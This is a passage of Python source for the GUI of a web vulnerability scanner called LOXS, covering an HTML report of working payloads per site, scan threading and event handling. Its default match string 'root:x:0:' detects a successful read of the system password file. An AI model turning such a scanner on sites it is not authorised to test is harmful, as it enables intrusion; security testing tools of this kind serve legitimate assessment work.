                  <td>{link(payload["url"])}</td>
                  <td>{esc(payload["details"])}</td>
                </tr>
                """
                for payload in finding["payloads"]
            )
            grouped_findings_html_parts.append(
                f"""
                <article class="finding">
                  <div class="finding-head">
                    <div>
                      <strong>{esc(finding["site"])}</strong>
                      <span>{esc(finding["scanner"])} / {esc(finding["target"])}</span>
                    </div>
                    <div class="count">{len(finding["payloads"])} working payload(s)</div>
                  </div>
                  <p>Example: {link(finding["example_url"])}</p>
                  <details>
                    <summary>Show working payloads</summary>
                    <table>
                      <thead><tr><th>Payload URL</th><th>Details</th></tr></thead>
                      <tbody>{payload_rows}</tbody>
                    </table>
                  </details>
                </article>
                """
            )
        grouped_findings_html = "\n".join(grouped_findings_html_parts)
        if not grouped_findings_html:
            grouped_findings_html = '<p class="empty">No unique vulnerable URL parameters found.</p>'

        all_rows_html = "\n".join(
            f"""
            <tr class="{'vuln' if row['vulnerable'] else 'clean'}">
              <td>{esc(row["scanner"])}</td>
              <td>{'Vulnerable' if row['vulnerable'] else 'Not Vulnerable'}</td>
              <td>{link(row["url"])}</td>
              <td>{esc(row["details"])}</td>
            </tr>
            """
            for row in rows
        )

        return f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>LOXS Scan Report</title>
  <style>
    :root {{
      color-scheme: dark;
      --bg: #0f172a;
      --panel: #111827;
      --panel-2: #172033;
      --text: #e5e7eb;
      --muted: #94a3b8;
      --border: #334155;
      --accent: #38bdf8;
      --success: #34d399;
      --danger: #f87171;
    }}
    * {{ box-sizing: border-box; }}
    body {{
      margin: 0;
      background: var(--bg);
      color: var(--text);
      font-family: "Segoe UI", Arial, sans-serif;
      line-height: 1.45;
    }}
    main {{ max-width: 1180px; margin: 0 auto; padding: 32px 24px 48px; }}
    h1, h2 {{ margin: 0 0 16px; }}
    h1 {{ color: var(--accent); }}
    section {{
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 8px;
      margin-top: 18px;
      padding: 18px;
    }}
    .summary {{
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 12px;
    }}
    .metric {{
      background: var(--panel-2);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 14px;
    }}
    .metric strong {{ display: block; color: var(--muted); font-size: 12px; text-transform: uppercase; }}
    .metric span {{ display: block; margin-top: 8px; font-size: 22px; font-weight: 700; }}
    table {{ width: 100%; border-collapse: collapse; table-layout: fixed; }}
    th, td {{ border-bottom: 1px solid var(--border); padding: 10px; text-align: left; vertical-align: top; word-break: break-word; }}
    th {{ color: var(--muted); font-size: 12px; text-transform: uppercase; }}
    a {{ color: var(--accent); text-decoration: none; }}
    a:hover {{ text-decoration: underline; }}
    .vuln td:nth-child(2), .vulnerable-count {{ color: var(--success); font-weight: 700; }}
    .clean td:nth-child(2) {{ color: var(--muted); }}
    .empty {{ color: var(--muted); text-align: center; }}
    .finding {{
      border: 1px solid var(--border);
      border-radius: 8px;
      background: #0b1220;
      padding: 14px;
      margin: 12px 0;
    }}
    .finding-head {{
      display: flex;
      justify-content: space-between;
      gap: 16px;
      align-items: flex-start;
    }}
    .finding-head strong {{ display: block; color: var(--text); font-size: 16px; }}
    .finding-head span {{ display: block; color: var(--muted); margin-top: 3px; }}
    .count {{
      color: var(--success);
      background: rgba(52, 211, 153, 0.12);
      border: 1px solid rgba(52, 211, 153, 0.32);
      border-radius: 999px;
      padding: 5px 10px;
      white-space: nowrap;
      font-size: 13px;
    }}
    details {{ margin-top: 10px; }}
    summary {{ cursor: pointer; color: var(--accent); }}
  </style>
</head>
<body>
  <main>
    <h1>LOXS Scan Report</h1>
    <section class="summary">
      <div class="metric"><strong>Generated</strong><span>{esc(generated)}</span></div>
      <div class="metric"><strong>Started</strong><span>{esc(started)}</span></div>
      <div class="metric"><strong>Scanners</strong><span>{esc(', '.join(scanners) or 'N/A')}</span></div>
      <div class="metric"><strong>Total Results</strong><span>{len(rows)}</span></div>
      <div class="metric"><strong>Unique Findings</strong><span class="vulnerable-count">{len(grouped_findings)}</span></div>
    </section>

    <section>
      <h2>Site Summary</h2>
      <table>
        <thead>
          <tr><th>Site</th><th style="width: 140px;">Unique Findings</th><th>Vulnerability Types</th></tr>
        </thead>
        <tbody>
          {site_summary_html}
        </tbody>
      </table>
    </section>

    <section>
      <h2>Unique Vulnerable URL Parameters</h2>
      {grouped_findings_html}
    </section>

    <section>
      <h2>All Results</h2>
      <table>
        <thead>
          <tr><th style="width: 140px;">Scanner</th><th style="width: 150px;">Status</th><th>URL</th><th>Details</th></tr>
        </thead>
        <tbody>
          {all_rows_html}
        </tbody>
      </table>
    </section>
  </main>
</body>
</html>
"""

    def start_scan(self) -> None:
        if self.worker and self.worker.is_alive():
            return

        urls = [line.strip() for line in self.urls_text.get("1.0", "end").splitlines() if line.strip()]
        if not urls:
            messagebox.showerror("LOXS GUI", "URL girin veya URL dosyası yükleyin.")
            return

        scanner = self.scanner_var.get()
        payloads: list[str] = []
        if scanner != "CRLF":
            try:
                payloads = load_payload_file(self.payload_path_var.get())
            except Exception as exc:
                messagebox.showerror("LOXS GUI", str(exc))
                return
            if not payloads:
                messagebox.showerror("LOXS GUI", "Payload dosyası boş.")
                return

        criteria = [item.strip() for item in self.criteria_var.get().split(",") if item.strip()] or ["root:x:0:"]
        cookie = self.cookie_var.get().strip() or None
        profile = self.profile_var.get().strip() or None

        self.stop_event.clear()
        self.start_button.configure(state="disabled")
        self.stop_button.configure(state="normal")
        self.scan_started_at = datetime.now()
        self.active_scanner = scanner
        self.status_var.set("Running")

        engine = ScannerEngine(self._queue_log, self._queue_result, self.stop_event)
        self.worker = threading.Thread(
            target=self._run_worker,
            args=(engine, scanner, urls, payloads, cookie, int(self.threads_var.get()), float(self.timeout_var.get()), criteria, profile),
            daemon=True,
        )
        self.worker.start()

    def _run_worker(
        self,
        engine: ScannerEngine,
        scanner: str,
        urls: list[str],
        payloads: list[str],
        cookie: str | None,
        threads: int,
        timeout: float,
        criteria: list[str],
        profile: str | None,
    ) -> None:
        try:
            engine.run(scanner, urls, payloads, cookie, threads, timeout, criteria, profile)
        except Exception as exc:
            self._queue_log(f"Error: {exc}")
        finally:
            self.events.put(("done", None))

    def stop_scan(self) -> None:
        self.stop_event.set()
        self.status_var.set("Stopping")
        self._queue_log("Stop requested.")

    def _queue_log(self, text: str) -> None:
        self.events.put(("log", text))

    def _queue_result(self, scanner: str, vulnerable: bool, url: str, details: str) -> None:
        self.events.put(("result", (scanner, vulnerable, url, details)))

    def _drain_events(self) -> None:
        try:
            while True:
                event_type, payload = self.events.get_nowait()
                if event_type == "log":
                    self._append_log(str(payload))
                elif event_type == "result":
                    scanner, vulnerable, url, details = payload
                    status = "Vulnerable" if vulnerable else "Not Vulnerable"
                    tag = "vulnerable" if vulnerable else "clean"
                    self.result_rows.append(
                        {
                            "scanner": scanner,
                            "vulnerable": vulnerable,
                            "url": url,
                            "details": details,
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        }
                    )
                    self.report_button.configure(state="normal")
                    self.results.insert("", "end", values=(scanner, status, url, details), tags=(tag,))
                    self._append_log(f"[{status}] {scanner}: {url} ({details})")
                elif event_type == "done":
                    self.start_button.configure(state="normal")
                    self.stop_button.configure(state="disabled")
                    found = sum(1 for row in self.result_rows if row["vulnerable"])
                    total = len(self.result_rows)
                    if self.stop_event.is_set():
                        self.status_var.set(f"Stopped - {found}/{total} vulnerable")
                    else:
                        self.status_var.set(f"Finished - {found}/{total} vulnerable")
        except queue.Empty:
            pass
        self.after(120, self._drain_events)

    def _append_log(self, text: str) -> None:
        self.log_text.configure(state="normal")
        self.log_text.insert("end", text + "\n")
        self.log_text.see("end")
        self.log_text.configure(state="disabled")


def main() -> None:
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("--no-gui", action="store_true")
    args, _unknown = parser.parse_known_args()
    if args.no_gui:
        print("LOXS GUI module loaded.")
        return

    app = LoxsGui()
    app.mainloop()


if __name__ == "__main__":
    main()
